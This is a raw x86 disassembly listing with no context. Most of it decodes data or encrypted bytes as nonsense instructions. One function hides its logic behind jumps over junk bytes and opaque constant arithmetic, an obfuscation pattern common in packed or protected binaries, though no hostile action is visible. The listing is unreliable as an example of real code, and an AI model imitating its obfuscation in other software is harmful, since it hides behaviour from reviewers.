  410c1c:	loop   0x410c60
  410c1e:	lods   al,BYTE PTR ds:[esi]
  410c1f:	mov    ah,0x4d
  410c21:	fcom   st(0)
  410c23:	das    
  410c24:	pop    ebp
  410c25:	push   edx
  410c27:	in     eax,dx
  410c28:	dec    edi
  410c29:	inc    ebx
  410c2a:	ret    
  410c2b:	sub    eax,0x77a7e9ea
  410c30:	pop    ss
  410c31:	out    0x43,al
  410c33:	imul   edi,DWORD PTR [esi-0x18],0x63159136
  410c3a:	lods   eax,DWORD PTR ds:[esi]
  410c3b:	loop   0x410c6b
  410c3d:	fidiv  DWORD PTR [esi+edx*4-0x5a]
  410c41:	movq   mm1,QWORD PTR [ecx]
  410c44:	sbb    dh,BYTE PTR [eax]
  410c46:	and    BYTE PTR ds:[ecx+0x6],0xd5
  410c4b:	gs hlt 
  410c4d:	jp     0x410c91
  410c4f:	sub    al,0x29
  410c51:	add    BYTE PTR [eax],0xa3
  410c54:	dec    esp
  410c55:	lds    eax,FWORD PTR [eax]
  410c57:	shl    DWORD PTR ds:0xd8b507f2,0xae
  410c5e:	push   ds
  410c5f:	ret    
  410c60:	lods   eax,DWORD PTR ds:[si]
  410c62:	pop    es
  410c63:	fiadd  WORD PTR ds:0xa0fd9613
  410c69:	fwait
  410c6a:	sub    eax,0x47f1acfc
  410c6f:	loope  0x410c5b
  410c71:	pop    edi
  410c72:	(bad)  
  410c73:	imul   eax,DWORD PTR [eax+eax*1-0x70b1aa51],0xffffffcf
  410c7b:	sti    
  410c7c:	out    dx,eax
  410c7d:	mov    ebp,ecx
  410c7f:	pop    eax
  410c80:	cdq    
  410c81:	add    ch,cl
  410c83:	push   edx
  410c84:	push   cs
  410c85:	sub    DWORD PTR [ecx+0x27],0x38
  410c89:	xor    edi,ebp
  410c8b:	cmp    DWORD PTR ds:0x3a31863d,ebx
  410c91:	lock in al,0xd2
  410c94:	adc    al,0xc7
  410c96:	cmp    DWORD PTR [ecx-0x1f8334b7],ecx
  410c9c:	fs inc esi
  410c9e:	dec    ecx
  410c9f:	(bad)  
  410ca0:	adc    eax,esi
  410ca2:	dec    ecx
  410ca3:	lods   eax,DWORD PTR ds:[esi]
  410ca4:	outs   dx,BYTE PTR ds:[esi]
  410ca5:	dec    ecx
  410ca6:	pop    ecx
  410ca7:	dec    ebp
  410ca8:	cmp    DWORD PTR [edi+ebp*4+0x65],ebx
  410cac:	pop    ebp
  410cad:	lds    ebx,FWORD PTR [ecx+0x69]
  410cb0:	lods   eax,DWORD PTR ds:[esi]
  410cb1:	adc    esi,eax
  410cb3:	pop    ebp
  410cb4:	fnstcw WORD PTR [edx+0x7]
  410cb7:	hlt    
  410cb8:	jb     0x410d2c
  410cba:	pop    ecx
  410cbb:	retf   
  410cbc:	xchg   ebp,eax
  410cbd:	fisttp QWORD PTR [edi+esi*2-0x1c95aa7a]
  410cc4:	lahf   
  410cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410cc6:	cld    
  410cc7:	ficom  WORD PTR gs:[esi+ecx*2-0x4b]
  410ccc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410ccd:	mov    BYTE PTR [esp+ebp*2],bh
  410cd0:	retf   0xc79d
  410cd3:	lock sub DWORD PTR [esi+eiz*8],ecx
  410cd7:	sar    ch,1
  410cd9:	(bad)  
  410cda:	ds retf 0xc677
  410cde:	cmc    
  410cdf:	aad    0x54
  410ce1:	arpl   WORD PTR [edx],si
  410ce3:	shr    DWORD PTR [eax+0x24beb52a],1
  410ce9:	cdq    
  410cea:	sahf   
  410ceb:	xor    al,0xe2
  410ced:	mov    edi,0xb76eb42b
  410cf2:	xchg   DWORD PTR [esi],esp
  410cf4:	mov    ebp,0x987b80f
  410cf9:	sar    BYTE PTR [ebx+0x18],0x39
  410cfd:	mov    ds:0xb2ac319c,eax
  410d02:	inc    edi
  410d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d04:	push   ebx
  410d05:	push   edx
  410d06:	test   eax,0xd1eea9e4
  410d0b:	mov    edi,0xdbc611ce
  410d10:	sub    BYTE PTR [esi+0x47a4addb],dl
  410d16:	add    edx,ecx
  410d18:	or     eax,0x44a92ecc
  410d1d:	push   0x40
  410d1f:	in     eax,0x19
  410d21:	xor    dl,BYTE PTR [edi-0x55]
  410d24:	mov    ebp,0x90d8ea08
  410d29:	jb     0x410cef
  410d2b:	cdq    
  410d2c:	pop    edi
  410d2d:	jnp    0x410ce2
  410d2f:	fld    TBYTE PTR [edx]
  410d31:	pop    ecx
  410d32:	fadd   QWORD PTR [edx-0x12c1c0af]
  410d38:	daa    
  410d39:	cdq    
  410d3a:	rcl    BYTE PTR [eax],cl
  410d3c:	mov    eax,ds:0x8d8f10d5
  410d41:	ja     0x410d0f
  410d43:	lea    ebp,ds:0x97c58cd2
  410d49:	in     eax,dx
  410d4a:	xchg   DWORD PTR [ecx],ebx
  410d4c:	jmp    0x410cf7
  410d4e:	mov    dl,0xd8
  410d50:	or     esi,DWORD PTR [edx-0x67]
  410d53:	hlt    
  410d54:	xchg   esp,eax
  410d55:	fcomp  DWORD PTR [ecx+0x584f02d3]
  410d5b:	neg    BYTE PTR [ebx-0x16]
  410d5e:	(bad)  
  410d60:	in     eax,0x4
  410d62:	loop   0x410db2
  410d64:	mov    bl,0x3e
  410d66:	loopne 0x410cfb
  410d68:	jmp    0x379e:0xa005908e
  410d6f:	and    BYTE PTR [esi-0xc],0x6b
  410d73:	(bad)  
  410d74:	loopne 0x410d74
  410d76:	das    
  410d77:	fyl2xp1 
  410d79:	pop    es
  410d7a:	mov    cl,0xfa
  410d7c:	mov    ch,0xd
  410d7e:	call   0x244e:0xe46f98c0
  410d85:	mov    bh,0xe2
  410d87:	iret   
  410d88:	push   bx
  410d8a:	mov    ds:0x7970ca07,al
  410d8f:	dec    edx
  410d90:	scas   al,BYTE PTR es:[edi]
  410d91:	adc    BYTE PTR [ecx],0xb0
  410d94:	test   al,0x24
  410d96:	add    al,0x23
  410d98:	sbb    al,BYTE PTR [edi+0x47]
  410d9b:	int    0xf6
  410d9d:	push   0x19bcf93b
  410da2:	pop    ebp
  410da3:	sub    al,0x57
  410da5:	cmp    BYTE PTR [ecx-0x73],dh
  410da8:	into   
  410da9:	in     al,0xa3
  410dab:	fidivr WORD PTR [edi-0xf]
  410dae:	add    al,0xc8
  410db0:	jae    0x410dc5
  410db2:	mov    ebp,0xacd00ac8
  410db7:	add    bh,BYTE PTR [ebx]
  410db9:	or     DWORD PTR [ebx+0x77],edi
  410dbc:	mov    eax,0x52b079dc
  410dc1:	or     eax,DWORD PTR [edi]
  410dc3:	test   al,0x3
  410dc5:	sti    
  410dc6:	cld    
  410dc7:	stos   DWORD PTR es:[edi],eax
  410dc8:	jl     0x410dd9
  410dca:	ret    
  410dcb:	jbe    0x410e42
  410dcd:	std    
  410dce:	outs   dx,BYTE PTR ds:[esi]
  410dcf:	adc    DWORD PTR [esi-0x5cff8d4],edx
  410dd5:	jmp    0x42efab80
  410dda:	xchg   esp,eax
  410ddb:	xor    dl,BYTE PTR [edx]
  410ddd:	std    
  410dde:	mov    eax,0xfa12038d
  410de3:	or     eax,DWORD PTR [ecx+0x7e4dc6f5]
  410de9:	pop    edx
  410dea:	push   esi
  410deb:	cmp    DWORD PTR [ecx-0x36a4fbb0],ecx
  410df1:	ret    0x8
  410df4:	push   ebp
  410df5:	mov    ebp,esp
  410df7:	sub    esp,0x3c
  410dfa:	mov    DWORD PTR [ebp-0x20],0x3510
  410e01:	mov    DWORD PTR [ebp-0x1c],0x2104
  410e08:	mov    DWORD PTR [ebp-0x18],0x5d15
  410e0f:	mov    DWORD PTR [ebp-0x14],0x30cd
  410e16:	mov    DWORD PTR [ebp-0x10],0x1709
  410e1d:	mov    DWORD PTR [ebp-0xc],0x260b
  410e24:	jmp    0x4110ab
  410e29:	jo     0x410db5
  410e2b:	fldl2e 
  410e2d:	cmp    al,0xb9
  410e2f:	jo     0x410dcd
  410e31:	out    0x46,eax
  410e33:	mov    ah,BYTE PTR [esi+esi*4+0x3b9e54e9]
  410e3a:	dec    edx
  410e3b:	mov    esi,0xbec289be
  410e40:	mov    esi,0x890d4677
  410e45:	sahf   
  410e46:	psllw  mm4,QWORD PTR [ebx]
  410e49:	mov    eax,ds:0xc669b8bb
  410e4e:	mov    ds,WORD PTR [ecx]
  410e50:	inc    edi
  410e51:	jp     0x410ec3
  410e53:	retf   
  410e54:	cld    
  410e55:	test   al,0x7
  410e57:	sbb    al,0xb3
  410e59:	pop    ds
  410e5a:	out    0x1a,eax
  410e5c:	inc    eax
  410e5d:	push   eax
  410e5e:	inc    ebx
  410e5f:	data16 test BYTE PTR [ecx+0x5feb5bd1],bl
  410e66:	sti    
  410e67:	mov    ch,0x48
  410e69:	push   0xffffffff
  410e6b:	cwde   
  410e6c:	mov    eax,ds:0x2053946f
  410e71:	in     al,0xd4
  410e73:	mov    ah,0xa9
  410e75:	outs   dx,DWORD PTR ds:[esi]
  410e76:	cli    
  410e77:	push   ecx
  410e78:	mov    esi,0x846b2024
  410e7d:	cdq    
  410e7e:	lds    esi,FWORD PTR [ebx-0x41d9362e]
  410e84:	sbb    ah,cl
  410e86:	add    al,0x32
  410e88:	daa    
  410e89:	push   0x5684d698
  410e8e:	xchg   esi,eax
  410e8f:	jecxz  0x410e96
  410e91:	rcr    dl,cl
  410e93:	aam    0x22
  410e95:	or     BYTE PTR [esi+0x5c5d6075],ah
  410e9b:	jge    0x410edc
  410e9d:	ret    0xf76e
  410ea0:	cwde   
  410ea1:	js     0x410e57
  410ea3:	aad    0xea
  410ea5:	shr    BYTE PTR [eax-0x5732c015],cl
  410eab:	aaa    
  410eac:	(bad)  
  410ead:	dec    esi
  410eae:	mov    bh,0xb0
  410eb0:	add    DWORD PTR [edx+0x6d],edx
  410eb3:	ret    
  410eb4:	xchg   ecx,eax
  410eb5:	test   al,dh
  410eb7:	pop    edi
  410eb8:	or     esi,DWORD PTR [esi+0x6b2ff03d]
  410ebe:	push   es
  410ebf:	mov    fs,WORD PTR [edx-0x7a]
  410ec2:	ret    0x9f56
  410ec5:	sti    
  410ec6:	jge    0x410ec9
  410ec8:	popf   
  410ec9:	out    0xb0,al
  410ecb:	aas    
  410ecc:	clc    
  410ecd:	sbb    DWORD PTR [eax+esi*1],edx
  410ed0:	sahf   
  410ed1:	out    0x40,al
  410ed3:	test   DWORD PTR [ebp-0x46],ebx
  410ed6:	sub    edi,edi
  410ed8:	(bad)  
  410eda:	outs   dx,BYTE PTR ds:[esi]
  410edb:	adc    esp,ecx
  410edd:	xchg   ebp,eax
  410ede:	(bad)  
  410ee0:	mov    cl,BYTE PTR [ecx]
  410ee2:	cmp    eax,0xc76a6209
  410ee7:	outs   dx,DWORD PTR ds:[esi]
  410ee8:	cmp    ebp,edi
  410eea:	sub    eax,0x8c78a1be
  410eef:	mov    DWORD PTR [esi+0x142c2983],eax
  410ef5:	stos   BYTE PTR es:[edi],al
  410ef6:	js     0x410eb8
  410ef8:	mov    ch,BYTE PTR [ebx]
  410efa:	rcl    DWORD PTR [ecx+esi*1-0x4a],cl
  410efe:	jne    0x410f3a
  410f00:	out    dx,eax
  410f01:	cli    
  410f02:	jb     0x410f6f
  410f04:	xchg   ebx,eax
  410f05:	and    dl,BYTE PTR [esi-0x3a]
  410f08:	lods   eax,DWORD PTR ds:[esi]
  410f09:	inc    esi
  410f0a:	inc    eax
  410f0b:	cmp    edx,DWORD PTR [edi+0x3e]
  410f0e:	cmc    
  410f0f:	jae    0x410f61
  410f11:	ficomp DWORD PTR [edi]
  410f13:	outs   dx,DWORD PTR ds:[esi]
  410f14:	or     al,0xe0
  410f16:	adc    ah,bl
  410f18:	ja     0x410f63
  410f1a:	sbb    eax,0x31c3db85
  410f1f:	push   0x2c
  410f21:	aas    
  410f22:	retf   
  410f23:	daa    
  410f24:	xor    DWORD PTR [eax-0x10b89124],ecx
  410f2a:	cs retf 0xaa96
  410f2e:	xor    BYTE PTR [eax],cl
  410f30:	jl     0x410fa4
  410f32:	imul   eax,ebp,0x9293e41e
  410f38:	mov    ch,0xfd
  410f3a:	loope  0x410f5f
  410f3c:	mov    bl,0x45
  410f3e:	or     ecx,DWORD PTR [ebp+0x8a4c13e]
  410f44:	cdq    
  410f45:	mov    ebp,0x145c9cc9
  410f4a:	cmp    DWORD PTR [edx],ecx
  410f4c:	xor    ebx,ebx
  410f4e:	pop    ebx
  410f4f:	mov    ch,0x64
  410f51:	push   es
  410f52:	arpl   ax,si
  410f54:	loop   0x410f76
  410f56:	xlat   BYTE PTR ds:[ebx]
  410f57:	rcr    DWORD PTR [ecx-0x62ceb577],1
  410f5d:	push   edx
  410f5e:	or     eax,DWORD PTR [ebp+0x6192cc4f]
  410f64:	dec    ecx
  410f65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f66:	xchg   DWORD PTR ds:0xc1bcdf39,ebx
  410f6c:	pop    ds
  410f6d:	and    ebp,DWORD PTR [edi+0x471b6224]
  410f73:	add    ecx,DWORD PTR [eax-0x4b70f613]
  410f79:	add    eax,0x5ae9a4de
  410f7e:	(bad)  
  410f7f:	adc    ebx,DWORD PTR [edx]
  410f81:	mov    BYTE PTR [edi-0xa],ch
  410f84:	sub    al,0x44
  410f86:	adc    dl,cl
  410f88:	mov    ecx,0xf2b75998
  410f8d:	sbb    eax,0x7f71ae76
  410f92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410f93:	mov    al,ds:0x100cc2c
  410f98:	mov    ecx,0xf15d1225
  410f9d:	(bad)  
  410f9f:	mov    ds:0x102eb378,al
  410fa4:	jp     0x410f99
  410fa6:	add    eax,ecx
  410fa8:	(bad)  
  410fa9:	shr    DWORD PTR [ecx],1
  410fab:	cmp    eax,0xcce4b648
  410fb0:	scas   eax,DWORD PTR es:[edi]
  410fb1:	sub    al,BYTE PTR [edi]
  410fb3:	mov    al,ds:0xf4fd0233
  410fb8:	cwde   
  410fb9:	mov    ss,WORD PTR ds:0xe9b312e5
  410fbf:	push   0xd26377ac
  410fc4:	sbb    edx,DWORD PTR [esi-0x54e2a267]
  410fca:	pop    ebp
  410fcb:	lods   al,BYTE PTR ds:[esi]
  410fcc:	mov    DWORD PTR [edi+ecx*1],0xe7d913da
  410fd3:	or     edx,ecx
  410fd5:	inc    ebp
  410fd6:	leave  
  410fd7:	pop    eax
  410fd8:	jne    0x410f9a
  410fda:	fmul   st(7),st
  410fdc:	and    esi,DWORD PTR [ecx-0x53d3e005]
  410fe2:	jns    0x41103b
  410fe4:	xchg   BYTE PTR [edx],ch
  410fe6:	test   eax,0x84d34899
  410feb:	pushf  
  410fec:	jno    0x411000
  410fee:	push   cs
  410fef:	(bad)  
  410ff0:	fs lock dec edx
  410ff3:	sub    eax,0x6c63cd9f
  410ff8:	xor    DWORD PTR [ebx],ebx
  410ffa:	mov    edi,0x58e16879
  410fff:	(bad)  
  411000:	adc    dh,ch
  411002:	into   
  411003:	cs dec ecx
  411005:	adc    edi,edi
  411007:	mov    esp,0x8de2a2db
  41100c:	inc    ebp
  41100d:	or     al,0xf4
  41100f:	sti    
  411010:	fld    DWORD PTR ds:0x8a44b4ad
  411016:	pop    esp
  411017:	ret    0x5a7b
  41101a:	mov    edx,0x84f978eb
  41101f:	pop    ebp
  411020:	inc    eax
  411021:	ins    BYTE PTR es:[edi],dx
  411022:	inc    ebp
  411023:	inc    ebp
  411024:	cli    
  411025:	syscall 
  411027:	fistp  WORD PTR [edi]
  411029:	inc    ecx
  41102a:	ins    BYTE PTR es:[edi],dx
  41102b:	mov    ebp,0xf2c1d9d6
  411030:	das    
  411031:	add    edi,DWORD PTR [ebx+0xba1e11b]
  411037:	jp     0x410ffa
  411039:	add    eax,0x50f02dff
  41103e:	bound  eax,QWORD PTR [edx-0x2e]
  411041:	pop    ebx
  411042:	out    dx,eax
  411043:	mov    bh,0xda
  411045:	sbb    DWORD PTR es:[ebx],0x2aa6c4e8
  41104c:	xchg   ebp,eax
  41104d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41104e:	sbb    edi,DWORD PTR [edi-0x4f1f0423]
  411054:	jle    0x410fff
  411056:	sbb    edx,eax
  411058:	add    eax,0xf2bd2bc8
  41105d:	pop    ds
  41105e:	inc    edi
  41105f:	addr16 dec edx
  411061:	jl     0x411094
  411063:	xor    dl,bl
  411065:	and    BYTE PTR [edx-0x22],dh
  411068:	push   0xffffffdf
  41106a:	inc    esi
  41106b:	ret    0xa0fb
  41106e:	mov    bl,0xeb
  411070:	call   0x6a1ed2bc
  411075:	mov    fs,esp
  411077:	fist   WORD PTR [ecx]
  411079:	sbb    BYTE PTR [ebp-0xc0031c4],bl
  41107f:	xchg   BYTE PTR [esi-0x40940e79],bl
  411085:	nop
  411086:	aad    0xc4
  411088:	xchg   esi,eax
  411089:	xchg   ecx,eax
  41108a:	dec    ebp
  41108b:	mov    ch,0xde
  41108d:	test   al,0x38
  41108f:	add    dl,BYTE PTR [ecx]
  411091:	clc    
  411092:	cs ins BYTE PTR es:[edi],dx
  411094:	inc    esp
  411095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411096:	add    DWORD PTR [edx-0x4768ed43],0x8
  41109d:	sub    eax,0x69a4d0a1
  4110a2:	lock mov BYTE PTR ds:0xaeab848e,bh
  4110a9:	mov    ebx,0xf845c79e
  4110ae:	add    al,0x32
  4110b0:	add    BYTE PTR [eax],al
  4110b2:	mov    DWORD PTR [ebp-0x4],0x62ea
  4110b9:	mov    DWORD PTR [ebp-0x38],0x58e9
  4110c0:	jmp    0x411347
  4110c5:	pop    edx
  4110c6:	daa    
  4110c7:	fcomp  QWORD PTR [eax-0x44]
  4110ca:	mov    esp,0xf3ba2b5a
  4110cf:	aad    0xe3
  4110d1:	and    edx,ebx
  4110d3:	leave  
  4110d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d5:	or     BYTE PTR [esi-0x42],cl
  4110d8:	mov    esi,0xbebec289
  4110dd:	xchg   DWORD PTR [ecx+edi*8],ecx
  4110e0:	xchg   ebx,eax
  4110e1:	cs push cs
  4110e3:	or     DWORD PTR [ebx-0x54],esp
  4110e6:	jb     0x41115a
  4110e8:	jne    0x4110eb
  4110ea:	sub    ch,BYTE PTR [eax+ebp*4]
  4110ed:	sbb    ebx,esi
  4110ef:	jl     0x4110c9
  4110f1:	mov    esi,0x3638bb4b
  4110f6:	call   0x17d8f44a
  4110fb:	stos   BYTE PTR es:[edi],al
  4110fc:	jae    0x411121
  4110fe:	sbb    ebx,DWORD PTR [esp+edx*2-0x80]
  411102:	jno    0x41111f
  411104:	ds ret 
  411106:	cli    
  411107:	push   0x86a7d9ac
  41110c:	test   al,0xe8
  41110e:	loop   0x411150
  411110:	add    al,0xa2
  411112:	(bad)  
  411113:	sub    DWORD PTR [edx+ebp*4+0x51],edx
  411117:	repnz mov fs,WORD PTR [edi]
  41111a:	imul   ebx,ebx,0x3be1ccc8
  411120:	inc    ebx
  411121:	js     0x411115
  411123:	in     eax,dx
  411124:	pop    esi
  411125:	cdq    
  411126:	nop
  411127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411128:	sub    edx,esi
  41112a:	mov    al,ds:0xf3f6ebf4
  41112f:	lea    esi,[eax]
  411131:	bound  eax,QWORD PTR [esi]
  411133:	add    ch,0x32
  411136:	mov    ebx,0xa5b1fbd4
  41113b:	lds    ecx,FWORD PTR [edx+eiz*2]
  41113e:	xlat   BYTE PTR ds:[ebx]
  41113f:	scas   eax,DWORD PTR es:[edi]
  411140:	retf   0x7536
  411143:	cmp    al,0x6c
  411145:	loope  0x411127
  411147:	sub    BYTE PTR [esi-0x43479a37],bl
  41114d:	aam    0xb5
  41114f:	imul   edx,DWORD PTR [esi+0x658590ee],0x40
  411156:	adc    esi,0xeca2df9f
  41115c:	or     edx,DWORD PTR [ecx-0xc8f7e77]
  411162:	xchg   esi,eax
  411163:	mov    ecx,0x9ea24d7f
  411168:	push   edi
  411169:	ret    
  41116a:	sbb    al,0x40
  41116c:	cmp    eax,0xcffcce3b
  411171:	xchg   BYTE PTR [esi+ebx*2-0x4ebbce24],al
  411178:	mov    al,ds:0x3309eae2
  41117d:	add    dl,cl
  41117f:	ins    DWORD PTR es:[edi],dx
  411180:	rcl    DWORD PTR [ebp+0x1c],0x22
  411184:	mov    ds,WORD PTR [esp+0x2a98bb1f]
  41118b:	mov    bh,bl
  41118d:	iret   
  41118e:	push   ds
  41118f:	mov    dh,0xbd
  411191:	mov    esi,0xf67f1dac
  411196:	jo     0x41119d
  411198:	sub    al,BYTE PTR [ebp+ebx*2+0x768f8e30]
  41119f:	test   DWORD PTR [edi],ebx
  4111a1:	mov    ds,WORD PTR [ebp+ebp*1-0x3c]
  4111a5:	mov    al,0x6a
  4111a7:	sbb    al,0x44
  4111a9:	into   
  4111aa:	jno    0x411163
  4111ac:	add    al,0x9e
  4111ae:	xchg   edi,eax
  4111af:	mov    al,0xb7
  4111b1:	xchg   ebx,eax
  4111b2:	cmp    ch,BYTE PTR [edx+0x60]
  4111b5:	rcl    BYTE PTR [esi],0xf3
  4111b8:	cmp    DWORD PTR [ebx-0x20],ecx
  4111bb:	inc    esp
  4111bc:	cmp    eax,0xfed0a5bb
  4111c1:	xor    BYTE PTR [ebx-0x4d468a7e],cl
  4111c7:	jle    0x411200
  4111c9:	clc    
  4111ca:	pop    ss
  4111cb:	pop    ebx
  4111cc:	shl    esp,1
  4111ce:	mov    eax,ds:0xe6e2679e
  4111d3:	repnz repnz xchg esp,eax
  4111d6:	mov    eax,0xa46d726c
  4111db:	push   esi
  4111dc:	and    eax,0x3b65e3c7
  4111e1:	xchg   ecx,eax
  4111e2:	cmp    DWORD PTR [edi],esp
  4111e4:	int    0xfa
  4111e6:	sub    eax,DWORD PTR [edi+ebx*8-0x384dc565]
  4111ed:	sub    DWORD PTR [edx+0x3e],esp
  4111f0:	xlat   BYTE PTR ds:[ebx]
  4111f1:	mov    ecx,0xaf77bfc5
  4111f6:	xor    ah,BYTE PTR [esi]
  4111f8:	push   ebx
  4111f9:	xor    DWORD PTR ds:0xd114f40a,ecx
  4111ff:	mov    al,ds:0xe14a91a2
  411204:	or     BYTE PTR [eax+0x41],0xf9
  411208:	lods   eax,DWORD PTR ds:[esi]
  411209:	lock into 
  41120b:	sub    eax,0xe093e549
  411210:	inc    ecx
  411211:	inc    ecx
  411212:	mov    al,ds:0xf7157c53
  411217:	push   0x49
  411219:	sahf   
  41121a:	xchg   ebp,eax
  41121b:	inc    edi
  41121c:	jl     0x411226
  41121e:	addr16 jbe 0x4111c0
  411221:	pop    DWORD PTR [eax-0xb4f9096]
  411227:	adc    al,0xbe
  411229:	push   edi
  41122a:	and    DWORD PTR [edx],ebp
  41122c:	retf   
  41122d:	aas    
  41122e:	xor    eax,0x59981ce9
  411233:	mov    cs,WORD PTR [edx-0x74]
  411236:	or     DWORD PTR [edx],0x5a
  411239:	mov    BYTE PTR [esi+0x2c],ah
  41123c:	cmc    
  41123d:	out    dx,al
  41123e:	sar    DWORD PTR [edx-0x3],0x6d
  411242:	fidivr WORD PTR [ebx+ebp*4-0x652c63e5]
  411249:	push   es
  41124a:	sbb    DWORD PTR [edi],ebx
  41124c:	or     ah,cl
  41124e:	adc    al,0xe9
  411250:	pop    edi
  411251:	cmp    BYTE PTR [ebx+edx*2+0x5d],0xc6
  411256:	in     al,dx
  411257:	xor    eax,0x2dc2811d
  41125c:	xor    BYTE PTR [edi+0x517941d1],dh
  411262:	int3   
  411263:	add    edi,DWORD PTR [ebx-0x2076d095]
  411269:	inc    ebx
  41126a:	pop    edx
  41126b:	repz das 
  41126d:	int3   
  41126e:	(bad)  
  41126f:	xchg   esi,eax
  411270:	ret    
  411271:	test   eax,0x789c68eb
  411276:	pop    ds
  411277:	pop    edx
  411278:	out    dx,eax
  411279:	cld    
  41127a:	adc    BYTE PTR [eax],ah
  41127c:	repnz clc 
  41127e:	rcl    DWORD PTR [ebx+0x45],0xb6
  411282:	mov    dh,0x0
  411284:	sub    DWORD PTR [edi-0x52],ebx
  411287:	xchg   DWORD PTR [eax-0x12],ebx
  41128a:	and    DWORD PTR [eiz*4-0x73a1b07d],esp
  411291:	and    al,dl
  411293:	and    BYTE PTR [edx],0x77
  411296:	add    DWORD PTR [eax],esi
  411298:	sbb    DWORD PTR [eax-0x37],ebx
  41129b:	mov    ebp,0x70f9bd7d
  4112a0:	leave  
  4112a1:	test   BYTE PTR [eax],ch
  4112a3:	outs   dx,DWORD PTR ds:[esi]
  4112a4:	and    al,BYTE PTR [ecx+0x34]
  4112a7:	mov    fs,edx
  4112a9:	(bad)  
  4112aa:	cld    
  4112ab:	cmp    dl,BYTE PTR [ebx]
  4112ad:	int3   
  4112ae:	dec    ebp
  4112af:	jle    0x411257
  4112b1:	add    BYTE PTR [edi],bl
  4112b3:	jbe    0x41130d
  4112b5:	lods   eax,DWORD PTR ds:[esi]
  4112b6:	pinsrw mm3,ecx,0x7d
  4112ba:	and    eax,0x53cbb662
  4112bf:	and    BYTE PTR [ebp+0x511d2c1],ah
  4112c5:	lock popa 
  4112c7:	jp     0x41124c
  4112c9:	sbb    DWORD PTR [eax],0x863cb2e9
  4112cf:	push   ebx
  4112d0:	test   al,0xaf
  4112d2:	call   0x6493:0x1cbcc217
  4112d9:	aad    0x7a
  4112db:	js     0x4112eb
  4112dd:	daa    
  4112de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112df:	outs   dx,DWORD PTR ds:[esi]
  4112e0:	sbb    esp,0x9a32720d
  4112e6:	mov    ch,0x76
  4112e8:	cli    
  4112e9:	and    DWORD PTR [edx],eax
  4112eb:	test   cl,ah
  4112ed:	sub    DWORD PTR [ebx+0x1b],ebx
  4112f0:	xor    eax,0xa2defc6a
  4112f5:	addr16 pop ebx
  4112f7:	inc    eax
  4112f8:	cmp    DWORD PTR [ecx-0x69],esp
  4112fb:	jp     0x4112d1
  4112fd:	mov    ds:0x3ecf261c,eax
  411302:	inc    ebx
  411303:	mov    ds:0x32b414fb,eax
  411308:	lds    eax,FWORD PTR ds:0xb30dfbe7
  41130e:	xchg   edx,eax
  41130f:	loope  0x4112db
  411311:	aaa    
  411312:	xchg   ebp,eax
  411313:	jmp    0xf645:0x92e8e252
  41131a:	or     BYTE PTR [edi-0x13],0x8b
  41131e:	inc    esi
  41131f:	cs enter 0x8ce7,0xa1
  411324:	push   eax
  411325:	sar    BYTE PTR [edx],cl
  411327:	(bad)  
  411329:	mov    esp,0x6ed9931b
  41132e:	cmp    BYTE PTR [ecx],0x73
  411331:	pop    eax
  411332:	sbb    al,0xbe
  411334:	out    0xf7,al
  411336:	add    esp,esi
  411338:	dec    ecx
  411339:	ins    BYTE PTR es:[edi],dx
  41133a:	mov    eax,DWORD PTR [edi+ebx*1]
  41133d:	pop    edx
  41133e:	cmp    eax,0x44a54b6
  411343:	mov    ecx,ebx
  411345:	jb     0x4113c5
  411347:	mov    DWORD PTR [ebp-0x34],0x7f89
  41134e:	mov    DWORD PTR [ebp-0x30],0x7fda
  411355:	mov    DWORD PTR [ebp-0x2c],0x2889
  41135c:	mov    DWORD PTR [ebp-0x28],0xf0f
  411363:	mov    DWORD PTR [ebp-0x24],0x58e1
  41136a:	mov    DWORD PTR [ebp-0x3c],0x69c
  411371:	mov    eax,DWORD PTR [ebp-0x10]
  411374:	mov    ecx,DWORD PTR [ebp-0x14]
  411377:	and    al,0xb9
  411379:	add    al,cl
  41137b:	mov    ecx,DWORD PTR [ebp-0x18]
  41137e:	and    al,cl
  411380:	mov    ecx,DWORD PTR [ebp-0x1c]
  411383:	sub    al,0x11
  411385:	and    al,cl
  411387:	mov    ecx,DWORD PTR [ebp-0x20]
  41138a:	mov    edx,DWORD PTR [ebp+0x8]
  41138d:	imul   ecx,ecx,0x6008
  411393:	add    ecx,0x1759dd6e
  411399:	add    al,0x4d
  41139b:	xor    ecx,0x2b4185ee
  4113a1:	cmp    BYTE PTR [ecx+edx*1],al
  4113a4:	jne    0x41143e
  4113aa:	mov    ecx,DWORD PTR [ebp-0x4]
  4113ad:	mov    eax,0xffffeff8
  4113b2:	mov    edx,eax
  4113b4:	sub    edx,ecx
  4113b6:	add    edx,DWORD PTR [ebp-0x8]
  4113b9:	mov    ecx,DWORD PTR [ebp-0xc]
  4113bc:	or     edx,ecx
  4113be:	mov    ecx,DWORD PTR [ebp-0x4]
  4113c1:	imul   edx,edx,0x85300
  4113c7:	sub    eax,ecx
  4113c9:	add    eax,DWORD PTR [ebp-0x8]
  4113cc:	mov    ecx,DWORD PTR [ebp-0xc]
  4113cf:	or     eax,ecx
  4113d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4113d4:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  4113db:	add    eax,0x40e5
  4113e0:	imul   eax,eax,0x214c
  4113e6:	add    eax,ecx
  4113e8:	mov    ecx,DWORD PTR [ebp+0x8]
  4113eb:	add    ecx,eax
  4113ed:	mov    DWORD PTR [ebp+0x8],ecx
  4113f0:	mov    eax,DWORD PTR [ebp-0x24]
  4113f3:	mov    ecx,DWORD PTR [ebp-0x28]
  4113f6:	and    eax,ecx
  4113f8:	mov    ecx,DWORD PTR [ebp-0x2c]
  4113fb:	and    eax,ecx
  4113fd:	mov    ecx,DWORD PTR [ebp-0x30]
  411400:	imul   eax,ecx
  411403:	mov    ecx,DWORD PTR [ebp-0x34]
  411406:	or     eax,ecx
  411408:	mov    ecx,DWORD PTR [ebp-0x38]
  41140b:	imul   eax,ecx
  41140e:	mov    ecx,DWORD PTR [ebp+0x8]
  411411:	sub    eax,0x777ea653
